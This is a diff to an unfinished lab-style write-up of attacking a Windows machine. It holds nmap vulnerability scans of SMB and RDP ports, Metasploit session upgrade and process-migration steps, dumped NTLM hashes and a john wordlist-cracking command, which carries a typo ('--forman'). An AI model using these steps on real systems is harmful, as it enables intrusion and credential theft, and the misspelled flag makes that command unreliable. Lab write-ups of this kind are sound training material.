@@ -1,8 +1,15 @@
 # TODO: need to fininsh this
 
+\#Lazy Writeup
+
+### Enum
+
 > nmap -A $TARGET
+
 > nmap -p 1-1000 $TARGET
+
 > nmap --script vuln -p 135,139,445,3389 $TARGET
+
 
 ### Metasploit
 
@@ -12,10 +19,11 @@
 
 > msf\> sessions -u 1
 
+---
 
 > ps
 
-migrated to 2528 SVCHOST.exe
+> migrate 2528 //SVCHOST.exe
 
 ### Cracking
 
@@ -26,6 +34,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ```
+
 > john --wordlist=/usr/share/wordlists/rockyou.txt --forman=NT jon.hash
 
 
